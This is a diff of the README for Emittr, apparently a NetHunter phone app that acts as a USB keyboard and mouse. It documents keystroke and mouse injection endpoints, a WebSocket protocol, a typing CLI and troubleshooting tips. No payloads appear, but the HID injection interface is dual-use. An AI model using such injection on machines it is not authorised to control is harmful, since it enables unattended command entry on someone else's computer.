+| `POST` | `/api/key` | Injects a modifier combo or named key | `{"combo": "win+r"}` or `{"key": "enter"}` |
+| `POST` | `/api/mouse` | Injects mouse movement, buttons, or scroll | `{"dx": 10, "dy": -5, "wheel": 2, "wheel_h": 0}` |
 
-### WebSocket Messages (`ws://<ip>:8088/ws`)
-
-Clients can send JSON commands over `/ws` for sub-5ms low latency:
+### WebSocket (`ws://<phone-ip>:8088/ws`)
+For sub-5ms interactive control, connect to `/ws`:
 ```json
-// Live keystroke
-{ "action": "live_char", "char": "a" }
+// Live keystroke injection
+{ "action": "live_char", "char": "x" }
 
-// Mouse movement
-{ "action": "mouse_move", "dx": 12, "dy": -4 }
+// Continuous mouse movement
+{ "action": "mouse_move", "dx": 8, "dy": -3 }
 
-// Mouse click (1=Left, 2=Right, 4=Middle)
+// Click (1=Left, 2=Right, 4=Middle)
 { "action": "mouse_click", "button": 1 }
 
-// Multi-axis scroll (wheel_v = vertical, wheel_h = horizontal AC Pan)
-{ "action": "mouse_scroll", "wheel_v": -2, "wheel_h": 1 }
+// Dual-axis scroll (wheel_v = vertical, wheel_h = AC Pan horizontal)
+{ "action": "mouse_scroll", "wheel_v": 3, "wheel_h": -2 }
 
 // Emergency release
 { "action": "release_all" }
@@ -261,46 +339,50 @@ Clients can send JSON commands over `/ws` for sub-5ms low latency:
 
 ---
 
-## ⌨️ CLI Tool (`usbtype`)
+## 🧙 The Exorcism Guide (Troubleshooting & FAQs)
 
-Emittr includes a standalone terminal CLI for scripting and automation:
+<details>
+<summary><b>❓ Q: My host PC is acting possessed (opening search bars, zooming when I click, capital letters everywhere)!</b></summary>
 
-```bash
-# Check USB connection status
-usbtype --status
+**Diagnosis**: The classic *"Sticky Modifier Curse"*. The USB connection dropped while a modifier key like <kbd>Ctrl</kbd> or <kbd>Shift</kbd> was pressed, leaving the host OS driver waiting forever for a release report.  
+**The Cure**:
+1. Tap the bright red **"Unstick"** button in Emittr's top navigation bar.
+2. Or run `usbtype --release` in terminal.
+3. In Emittr v1.3.0, the hardware UDC watchdog automatically flushes release reports the moment you reconnect the cable!
+</details>
 
-# Type a string onto the target machine
-usbtype "sudo apt update && sudo apt upgrade -y"
+<details>
+<summary><b>❓ Q: Why does my NetHunter phone keep reverting to Mass Storage mode when unplugged?</b></summary>
 
-# Type with custom delay (30ms per character)
-usbtype --delay 30 "Slow typing text block"
+**Diagnosis**: Android's `UsbDeviceManager` service is an uninvited guest. When it detects an OTG disconnect, it aggressively resets `sys.usb.config` back to default Android modes (`mtp,mass_storage`), destroying your HID gadget.  
+**The Cure**:
+Emittr runs an active 1.5-second watchdog in `server.py` that clamps down on `sys.usb.config`, prevents mass storage takeover, and instantly restores `/dev/hidg0` without rebooting your phone.
+</details>
 
-# Inject special keys or shortcuts
-usbtype --key win+r
-usbtype --key enter
-usbtype --key ctrl+alt+del
-```
+<details>
+<summary><b>❓ Q: Why does Chrome Mobile show unstyled HTML blocks?</b></summary>
 
----
+**Diagnosis**: Chrome Mobile has aggressive disk caching habits. If it previously cached an older version of `style.css`, it serves the old stylesheet for the new markup.  
+**The Cure**:
+Emittr v1.3.0 embeds **Inline Critical CSS** directly into `<head>`, appends cache-busting version tokens (`?v=1.3.0`), and sends `Cache-Control: no-cache, no-store, must-revalidate`. Do a single pull-down refresh and it’s pristine forever.
+</details>
 
-## ❓ Troubleshooting & FAQ
+<details>
+<summary><b>❓ Q: Does horizontal scrolling actually work on Windows without extra software?</b></summary>
 
-### 1. Windows reports `Code 10: Device cannot start`
-- Ensure you are running Emittr v1.3.0. Earlier versions with multiple separate `hid.0` and `hid.1` functions caused descriptor length collisions. Emittr v1.3.0 uses a single unified composite HID descriptor on `/dev/hidg0`.
-
-### 2. My PC's `Ctrl` key is stuck down after unplugging
-- Tap the red **"Unstick"** button in the Emittr header.
-- Alternatively, press and release `Left Ctrl` and `Right Ctrl` once on any physical keyboard attached to the PC.
-- In Emittr v1.3.0, automatic plug-in zero report flushes eliminate this issue automatically.
-
-### 3. Does horizontal scroll work in Windows?
-- Yes! Emittr v1.3.0 uses native HID AC Pan (`Usage 0x0238`) in the mouse report descriptor. When you deflect the horizontal Xbox joystick or swipe horizontally with two fingers, Windows natively receives `WM_MOUSEHWHEEL`.
-
-### 4. How do I access via `http://hid.keyboard` without specifying port 8088?
-- Emittr runs an asynchronous port 80 redirector in userland. As long as `hid.keyboard` resolves to `127.0.0.1` on the phone (automatically configured by `02-usb-deck.sh`), typing `http://hid.keyboard` will route directly to port 8088.
+**Diagnosis**: Yes! Older apps tried to simulate horizontal scrolling by holding <kbd>Shift</kbd> while moving the vertical wheel. This broke in Excel and caused stuck keys.  
+**The Cure**:
+Emittr implements official USB HID **AC Pan (Usage 0x0238)** inside Report ID 2. Windows natively translates this into standard `WM_MOUSEHWHEEL` messages. Works seamlessly in VS Code, Excel, Chrome, Sublime, and Photoshop.
+</details>
 
 ---
 
-## 📄 License
+## 📜 License & Credits
 
-This project is licensed under the [MIT License](LICENSE).
+Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for complete terms.
+
+Designed & built for hackers, sysadmins, and anyone who believes typing passwords manually onto headless servers is a relic of the past.
+
+<div align="center">
+  <sub>Built with ⚡ by <a href="https://github.com/mranj">mranj</a> & pair-programmed with Antigravity</sub>
+</div>
